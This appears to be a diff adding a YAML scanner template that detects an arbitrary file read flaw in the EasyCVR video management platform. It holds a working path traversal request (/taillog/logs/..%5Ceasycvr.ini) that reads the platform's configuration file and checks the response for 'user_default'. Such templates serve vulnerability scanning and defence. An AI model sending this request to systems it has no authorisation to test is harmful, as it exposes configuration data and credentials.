@@ -1,0 +1,12 @@
+name: EasyCVR视频管理平台-taillog-文件读取
+description: >-
+  任意文件读取
+alwaysExecute: false
+matchCount: 1
+rules:
+  - method: GET
+    path: /taillog/logs/..%5Ceasycvr.ini
+    expression:
+      status: 200
+      body_all:
+        - "user_default"
